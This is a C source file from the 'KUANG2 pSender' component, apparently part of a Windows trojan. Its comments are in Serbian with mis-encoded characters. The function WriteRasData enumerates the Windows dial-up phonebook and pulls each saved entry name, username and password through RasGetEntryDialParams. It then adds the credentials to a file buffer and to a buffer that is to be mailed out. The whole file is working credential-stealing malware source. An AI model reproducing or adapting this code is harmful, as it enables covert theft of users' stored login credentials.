/***[ThuNderSoft]*************************************************************
						  KUANG2 pSender: WriteRasData
								˙˘ƒÕ WEIRD Õƒ˘˙
*****************************************************************************/

#include <windows.h>
#include <ras.h>
#include <raserror.h>
#include <strmem.h>
#include <tools.h>
#include <win95e.h>

extern char buff[];		// ovde se dodaje ono Ñto se Ñalje
extern char temp[];

/*
	WriteRasData
	------------
  ˛ Åita RasPodatke i njih snima u bafer. Ovi podaci su 100% sigurni, ako ih
	uopÑte ima.	 Nema ih kada je iskljuÅeno 'Save Password'. */

BOOL WriteRasData(char *fb)
{
	RASENTRYNAME *rasko;				// ovde smesti ras entry-je (phone-books)
	RASDIALPARAMS rasdata;				// info o pojedinaÅnom DialUpu
	BOOL ispassget;						// da li je uzet password?
	DWORD entrysize;					// veliÅina ras entryja
	DWORD brojDUP;						// broj upisanih DUPova
	int rezultat;						// interna, smeÑta se rezultat f-ja
	int i;								// interni brojaÅ
	int maxdups;						// ukupan broj dupova
	BOOL retval;
	char wME[]="\r\nwME";
	char eRE[10]="\r\neRE";
	char eRG[8]="\r\neRG";

	retval=FALSE;
	maxdups=entrysize=0;
	rezultat=RasEnumEntries(NULL, NULL, NULL, &entrysize, &brojDUP);
	maxdups=brojDUP;	// Sada maxdups daje taÅan broj zapisa!

	entrysize=sizeof(RASENTRYNAME)*maxdups;			// ukupna veliÅina

	rasko=GlobalAlloc(GMEM_FIXED, entrysize);
	if (rasko==NULL) {
		straddF(buff, wME);
		return FALSE;			// izaîi
	}
	rasko[0].dwSize=sizeof(RASENTRYNAME);	// Prvi entry mora da ima setovan
											// dwSize da bi radilo
	// prebroji mi dial-up ove
	rezultat = RasEnumEntries(NULL, NULL, &rasko[0], &entrysize, &brojDUP);

	if (rezultat == ERROR_BUFFER_TOO_SMALL) {
		straddF(buff, wME);
		GlobalFree(rasko);
		return FALSE;			// izaîi poÑto neÜe niÑta pisati
	} else {
		if (rezultat) {
			straddF(buff, eRE);
			GlobalFree(rasko);
			return FALSE;		// systemska greÑka
		}
	}

	for (i=0; i<brojDUP; i++) {
		// prvo iskopiraj ime DUP
		strcopyF(rasdata.szEntryName, rasko[i].szEntryName);
		// obavezno za ispravan rad f-je
		rasdata.dwSize=sizeof(RASDIALPARAMS);
		// uÅini ono Ñto moraÑ
		rezultat = RasGetEntryDialParams(NULL, &rasdata, &ispassget);
		if (rezultat)
			straddF(buff, eRG);
		else {
			// Nema greÑke, zapiÑi sve Ñto me zanima: Entry/User/Pass
			strcopyFaddd(temp, rasdata.szUserName, 0x0A0D);
			straddFaddd(temp, rasdata.szPassword, 0x0A0D);

			if (!strfind(fb, temp)) {
				retval=TRUE;				// nije naÑao je podatke
				straddF(fb, temp);			// dodaj ih u fajl bafer

				if (i==0) straddF(buff, "-----\r\n");              // odvoji
				straddFaddd(buff, rasdata.szEntryName, 0x0A0D); // dodaj entry name
				straddFaddd(buff, temp, 0x0A0D);		// dodaj ih i u mail-bafer
			}
		}
	}

	GlobalFree(rasko);	// oslobodi raska da ide kuÜi
	return retval;
}
